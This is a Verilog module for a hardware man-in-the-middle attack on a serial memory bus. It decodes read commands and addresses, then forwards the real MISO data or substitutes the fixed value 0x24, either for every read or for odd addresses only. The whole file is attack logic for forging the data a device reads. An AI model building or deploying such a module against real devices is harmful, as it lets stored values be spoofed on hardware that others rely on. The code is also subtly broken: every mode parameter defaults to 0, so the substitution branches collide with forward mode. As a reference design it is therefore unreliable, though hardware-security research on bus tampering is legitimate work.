/**
 * Main MITM logic module:
 * - utilizes the Bus control module to carry out MITM attacks
 * - generates output data based on input data
 * - decides whether to output real and fake data
 * - utilizes the Bus control interface to split the buffering of serial data into chunks (instruction, address and data bits)
**/

module MitmLogic #(

	// parameters
	parameter BUF_SIZE = 9,
	parameter CHUNK_SIZE_WIDTH = $clog2(BUF_SIZE+1),	// storing A requires exactly ceil(lg(A+1)) bits
	
	// MITM modes
	parameter NUM_MITM_MODES = 3,
	parameter MITM_MODE_FORWARD = 0,
	parameter MITM_MODE_SUB_ALL = 0,
	parameter MITM_MODE_SUB_HALF = 0
) (

	// system inputs
	input wire sys_clk,
	input wire rst,
	input wire [NUM_MITM_MODES-1:0] mode_select,
	
	// bus control inputs
	input wire comm_active,
	input wire bus_ready,
	
	// data inputs
	input wire [BUF_SIZE-1:0] real_miso_data,
	input wire [BUF_SIZE-1:0] real_mosi_data,
	
	// bus control outputs
	output reg cmd_next_chunk = 1'b0,
	output reg cmd_finish = 1'b0,
	
	output reg [CHUNK_SIZE_WIDTH-1:0] next_chunk_size,
	
	// data control outputs
	output reg fake_miso_select,
	output reg fake_mosi_select,
	
	// data outputs
	output reg [BUF_SIZE-1:0] fake_miso_data,
	output reg [BUF_SIZE-1:0] fake_mosi_data
);

	// states
	localparam STATE_IDLE = 4'd0;
	localparam STATE_INSTR_START = 4'd1;
	localparam STATE_INSTR = 4'd2;
	localparam STATE_ADDR_START = 4'd3;
	localparam STATE_ADDR = 4'd4;
	localparam STATE_DATA_START = 4'd5;
	localparam STATE_DATA = 4'd6;
	localparam STATE_FINISH_START = 4'd7;
	localparam STATE_FINISH = 4'd8;
	localparam STATE_RESET = 4'd9;

	// internal registers
	reg [3:0] state = STATE_RESET;

	always @ (posedge sys_clk)
	begin
		// on reset go to reset state
		if (rst == 1'b1) begin
			state <= STATE_RESET;
		end
		
		else begin
			// state transition logic
			case (state)
				
				// in idle state wait for communication to start
				STATE_IDLE: begin
					
					// if communication started, signal bus control to read instruction
					// (1 start bit + 2 instruction bits)
					if (comm_active == 1'b1) begin
						next_chunk_size <= 3;
						fake_miso_select <= 1'b0;
						fake_mosi_select <= 1'b0;
						cmd_next_chunk <= 1'b1;
						state <= STATE_INSTR_START;
					end
				end
				
				// delay one clock cycle for bus control to process inputs
				STATE_INSTR_START: begin
					cmd_next_chunk <= 1'b0;
					state <= STATE_INSTR;
				end
				
				// wait for bus control to read instruction
				STATE_INSTR: begin
				
					// evaluate if instruction is "read" and read address operand
					if (bus_ready == 1'b1) begin
					
						// if instruction is "read", signal bus control to read address operand
						if (real_mosi_data[2:0] == 3'b110) begin
							next_chunk_size <= 9;
							cmd_next_chunk <= 1'b1;
							state <= STATE_ADDR_START;
						end
						
						// else signal bus control to finish communication with current settings
						else begin
							next_chunk_size <= 0;
							cmd_finish <= 1'b1;
							state <= STATE_FINISH_START;
						end
					end
					
					// if communication was killed, finish
					else if (comm_active == 1'b0) begin
						state <= STATE_FINISH;
					end
				end
				
				// delay one clock cycle for bus control to process inputs
				STATE_ADDR_START: begin
					cmd_next_chunk <= 1'b0;
					state <= STATE_ADDR;
				end
				
				// wait for bus control to read address
				STATE_ADDR: begin
				
					// based on MITM mode decide what data to send on MISO line
					if (bus_ready == 1'b1) begin
						case (mode_select)
					
							// forward mode -- signal bus to finish with current 'forward' settings
							MITM_MODE_FORWARD: begin
								next_chunk_size <= 0;
								cmd_finish <= 1'b1;
								state <= STATE_FINISH_START;
							end
							
							// substitute all mode -- substitute all data with the constant 0x24
							MITM_MODE_SUB_ALL: begin
								next_chunk_size <= 8;
								fake_miso_data <= 8'h24 << (BUF_SIZE - 8); // write buffers operate from most significant bit
								fake_miso_select <= 1'b1;
								cmd_next_chunk <= 1'b1;
								state <= STATE_DATA_START;
							end
							
							// substitute every second mode -- substitute every second address data with the constant 0x24
							MITM_MODE_SUB_HALF: begin
							
								// address is even
								if (real_mosi_data[0] == 1'b0) begin
									next_chunk_size <= 0;
									cmd_finish <= 1'b1;
									state <= STATE_FINISH_START;
								end
								
								// address is odd
								else begin
									next_chunk_size <= 8;
									fake_miso_data <= 8'h24 << (BUF_SIZE - 8); // write buffers operate from most significant bit
									fake_miso_select <= 1'b1;
									cmd_next_chunk <= 1'b1;
									state <= STATE_DATA_START;
								end
							end
							
							// if no mode is selected, default is forward mode
							default: begin
								next_chunk_size <= 0;
								cmd_finish <= 1'b1;
								state <= STATE_FINISH_START;
							end
						
						endcase
					end
					
					// if communication was killed, finish
					else if (comm_active == 1'b0) begin
						state <= STATE_FINISH;
					end
				end
				
				// delay one clock cycle for bus control to process inputs
				STATE_DATA_START: begin
					cmd_next_chunk <= 1'b0;
					state <= STATE_DATA;
				end
				
				// wait for bus control to write data and signal bus to finish communication
				STATE_DATA: begin
					if (bus_ready == 1'b1) begin
						cmd_finish <= 1'b1;
						state <= STATE_FINISH_START;
					end
					
					// if communication was killed, finish
					else if (comm_active == 1'b0) begin
						state <= STATE_FINISH;
					end
				end
				
				// delay one clock cycle for bus control to process inputs
				STATE_FINISH_START: begin
					cmd_finish <= 1'b0;
					state <= STATE_FINISH;
				end
				
				// wait for communication to finish
				STATE_FINISH: begin
					if (comm_active == 1'b0) begin
						next_chunk_size <= 0;
						fake_miso_select <= 1'b0;
						fake_mosi_select <= 1'b0;
						state <= STATE_IDLE;
					end
				end
				
				// reset internal state
				STATE_RESET: begin
					next_chunk_size <= 0;
					fake_miso_select <= 1'b0;
					fake_mosi_select <= 1'b0;
					cmd_next_chunk <= 1'b0;
					cmd_finish <= 1'b0;
					fake_miso_data <= 0;
					fake_mosi_data <= 0;
					state <= STATE_IDLE;
				end
				
				// this should never occur
				default: begin
					state <= STATE_RESET;
				end
				
			endcase
		end
	end

endmodule